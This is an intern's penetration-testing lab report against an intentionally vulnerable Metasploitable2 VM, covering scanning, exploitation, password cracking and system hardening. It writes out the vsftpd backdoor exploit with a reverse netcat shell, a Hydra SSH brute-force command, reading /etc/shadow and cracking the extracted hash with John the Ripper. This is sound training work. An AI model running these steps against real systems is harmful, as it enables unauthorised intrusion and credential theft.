# ApexPlanet Cybersecurity Internship – Task 4

## Penetration Testing Workflow and System Hardening

### Objective

The objective of Task 4 was to understand and demonstrate a complete penetration testing workflow in an isolated and authorized lab environment.

The workflow covered:

**Reconnaissance → Scanning → Exploitation → Post-Exploitation → Password Attacks → Phishing Awareness → Malware Analysis → System Hardening → Reporting**

All testing was performed against the intentionally vulnerable **Metasploitable2** virtual machine using **Kali Linux** as the security testing machine.

---

# 1. Lab Environment

| Component               | Details                      |
| ----------------------- | ---------------------------- |
| Attacker                | Kali Linux                   |
| Target                  | Metasploitable2              |
| Kali Host-Only IP       | `192.168.56.103`             |
| Metasploitable2 IP      | `192.168.56.102`             |
| Network                 | VirtualBox Host-Only Network |
| Additional Kali Network | NAT for Internet access      |

The lab was isolated using a VirtualBox Host-Only network to prevent testing against external systems.

---

# 2. Reconnaissance and Scanning

## 2.1 Nmap Service Enumeration

The target was scanned to identify exposed services and their versions.

```bash
nmap -sV -p 21,22,6200 192.168.56.102
```

Important services identified included:

* TCP 21 – FTP
* TCP 22 – SSH
* TCP 6200 – VSFTPD backdoor-related service

The FTP service was identified as:

```text
vsftpd 2.3.4
```

The SSH service was identified as:

```text
OpenSSH 4.7p1 Debian 8ubuntu1
```

The outdated versions indicated potential security weaknesses suitable for controlled lab exploitation.

---

# 3. Exploitation – VSFTPD 2.3.4 Backdoor

## 3.1 Vulnerability Identification

The target was running **vsftpd 2.3.4**, a version associated with a known backdoor vulnerability.

Metasploit was used to demonstrate exploitation in the authorized lab.

```text
use exploit/unix/ftp/vsftpd_234_backdoor
```

The target was configured as:

```text
RHOSTS 192.168.56.102
RPORT 21
```

A reverse connection was configured to the Kali Host-Only address:

```text
LHOST 192.168.56.103
LPORT 4444
```

The payload used successfully was:

```text
cmd/unix/reverse_netcat
```

The exploit successfully opened a command shell on the target.

---

# 4. Post-Exploitation

After gaining access, basic system information and privilege level were checked.

### Current user

```bash
whoami
```

Output:

```text
root
```

### User and group information

```bash
id
```

The result confirmed UID 0 / root privileges.

### Operating system information

```bash
uname -a
```

This provided information about the Metasploitable2 Linux kernel and architecture.

The successful exploitation therefore demonstrated that a vulnerable network service could lead to **remote command execution with root-level privileges**.

### Note

A Meterpreter session was not successfully established with this exploit. Therefore, Meterpreter-specific commands such as `sysinfo` and `hashdump` were not claimed as completed. The successful root command shell was used for the subsequent authorized demonstrations.

---

# 5. SSH Password Attack

## 5.1 SSH Enumeration

SSH was identified using:

```bash
nmap -sV -p 22 192.168.56.102
```

The target was running:

```text
OpenSSH 4.7p1 Debian 8ubuntu1
```

A small controlled password list was created for the lab:

```text
123456
password
admin
msfadmin
letmein
```

The username tested was:

```text
msfadmin
```

## 5.2 Hydra Attempt

Hydra was used to demonstrate an SSH password attack:

```bash
hydra -l msfadmin -P ~/ssh_passwords.txt ssh://192.168.56.102 -t 1
```

The attack could not proceed because the modern Hydra SSH implementation could not negotiate a compatible MAC algorithm with the very old OpenSSH server.

The error indicated that the target only supported legacy MAC algorithms such as:

```text
hmac-md5
hmac-sha1
```

while the modern Hydra implementation offered newer algorithms.

### Result

The Hydra attack was **attempted but not successfully completed** due to compatibility between the modern attack tool and the obsolete SSH service.

Manual SSH authentication was subsequently verified using compatible legacy SSH options.

This limitation was documented rather than claiming a successful Hydra brute-force attack.

---

# 6. Password Hash Extraction and John the Ripper

After obtaining authorized root access to Metasploitable2, the password hash database was examined.

```bash
cat /etc/shadow
```

The `msfadmin` account hash was extracted for controlled offline password-cracking analysis.

The hash was saved locally on Kali:

```bash
echo 'msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/' > ~/metasploitable_hash.txt
```

John the Ripper was then executed:

```bash
john ~/metasploitable_hash.txt
```

John identified the hash as:

```text
md5crypt
```

The password was successfully recovered as:

```text
msfadmin
```

The result was verified using:

```bash
john --show ~/metasploitable_hash.txt
```

This demonstrated the security risk of weak passwords combined with an outdated password-hashing configuration.

---

# 7. Phishing Awareness Simulation

A local phishing-awareness simulation was created for educational purposes.

The simulation was stored in:

```text
~/Task4/phishing_simulation/
```

A local HTTP server was used:

```bash
python3 -m http.server 8080
```

The page was accessed locally through:

```text
http://127.0.0.1:8080
```

The simulation contained a fake login-style interface but **did not collect, store, or transmit credentials**.

The page clearly displayed:

> PHISHING AWARENESS SIMULATION – This is a training page. Do NOT enter real credentials.

The awareness section demonstrated several phishing detection techniques:

* Check the website domain carefully.
* Avoid unexpected login links.
* Be suspicious of urgent requests.
* Look for spelling and branding inconsistencies.
* Never provide passwords through suspicious links.

Clicking the login button displayed a message explaining that the page was only a training simulation.

---

# 8. Malware Basics – Static and Dynamic Analysis

A harmless Python training sample was created for malware-analysis practice.

The sample performed only benign actions such as:

* Displaying operating system information
* Displaying the hostname
* Creating a harmless test file
* Waiting for a few seconds
* Exiting normally

## 8.1 Static Analysis

The following commands were used:

```bash
file benign_sample.py
```

```bash
sha256sum benign_sample.py
```

```bash
strings benign_sample.py
```

```bash
cat benign_sample.py
```

These commands were used to examine the file type, cryptographic hash, readable strings, and source code without executing it.

## 8.2 Dynamic Analysis

The benign sample was executed in the isolated lab:

```bash
python3 benign_sample.py
```

The resulting file was checked using:

```bash
ls -l analysis_test.txt
```

and:

```bash
cat analysis_test.txt
```

This demonstrated the difference between:

### Static Analysis

Examining a file without execution.

### Dynamic Analysis

Observing the behavior of a sample while it executes in a controlled environment.

No real malware was used.

---

# 9. System Hardening

After completing the exploitation demonstrations, several defensive hardening actions were performed on Metasploitable2.

## 9.1 Initial Service Enumeration

Before hardening, the listening services were recorded using:

```bash
netstat -tulpn
```

This provided a baseline for comparison.

---

## 9.2 Security Update Check

The package repositories were refreshed using:

```bash
sudo apt-get update
```

Because Metasploitable2 is an intentionally vulnerable and extremely old lab image, a full system upgrade was not performed because it could alter or break the vulnerabilities required for the penetration-testing exercises.

---

## 9.3 Firewall Configuration

The VSFTPD backdoor-related TCP port was blocked using:

```bash
sudo iptables -A INPUT -p tcp --dport 6200 -j DROP
```

The firewall rule was verified using:

```bash
sudo iptables -L INPUT -n --line-numbers
```

This demonstrated how a firewall can be used to block unwanted traffic to a known malicious or vulnerable service port.

---

## 9.4 Disable Unused FTP Service

The FTP service was found to be managed through `xinetd`.

The configuration was located at:

```text
/etc/xinetd.d/vsftpd
```

The FTP service was disabled by changing:

```text
disable = no
```

to:

```text
disable = yes
```

The change was verified with:

```bash
grep -i disable /etc/xinetd.d/vsftpd
```

The resulting configuration was:

```text
disable = yes
```

The `xinetd` configuration was then reloaded:

```bash
sudo kill -HUP $(pidof xinetd)
```

Finally, port 21 was checked:

```bash
sudo netstat -tulpn | grep :21
```

No output was returned, confirming that FTP was no longer listening on TCP port 21.

A final service enumeration was also performed:

```bash
sudo netstat -tulpn
```

This provided the post-hardening service state.

---

# 10. Findings and Security Impact

| Finding                  | Impact                                      | Remediation                                  |
| ------------------------ | ------------------------------------------- | -------------------------------------------- |
| VSFTPD 2.3.4 backdoor    | Remote command execution and root access    | Remove/upgrade vulnerable FTP software       |
| Exposed FTP service      | Increased attack surface                    | Disable FTP if not required                  |
| Open TCP 6200            | Potential backdoor communication            | Block using firewall                         |
| Weak `msfadmin` password | Password compromise                         | Use strong unique passwords                  |
| Legacy SSH service       | Weak/obsolete cryptographic support         | Upgrade SSH                                  |
| Outdated software        | Increased vulnerability exposure            | Apply security patches                       |
| Phishing risk            | Credential theft through social engineering | User awareness training                      |
| Malware risk             | Potential malicious execution               | Use endpoint protection and sandbox analysis |

---

# 11. Penetration Testing Methodology Summary

The task demonstrated the major phases of a penetration testing workflow:

### 1. Reconnaissance

Information about the target environment and network services was collected.

### 2. Scanning

Nmap was used to identify open ports and service versions.

### 3. Exploitation

The vulnerable VSFTPD service was exploited using Metasploit.

### 4. Post-Exploitation

Root-level access was verified and system information was collected.

### 5. Password Attacks

SSH password testing was attempted with Hydra, while an extracted password hash was successfully cracked using John the Ripper.

### 6. Phishing Awareness

A local, non-functional phishing-awareness simulation was created.

### 7. Malware Analysis

A harmless sample was examined using static and dynamic analysis techniques.

### 8. System Hardening

Firewall rules were applied and an unnecessary FTP service was disabled.

### 9. Reporting

The findings, security impact, limitations, and remediation recommendations were documented.

---

# 12. Conclusion

Task 4 provided practical experience with the complete penetration-testing lifecycle in an isolated cybersecurity lab.

The exercises demonstrated how outdated services, weak credentials, exposed network ports, and social-engineering threats can increase an organization's attack surface.

The task also demonstrated the importance of defensive measures such as:

* Regular security updates
* Strong passwords
* Firewall rules
* Removing unnecessary services
* Security awareness training
* Malware analysis
* Continuous vulnerability assessment

All activities were performed against an intentionally vulnerable Metasploitable2 system in a controlled lab environment for educational purposes.
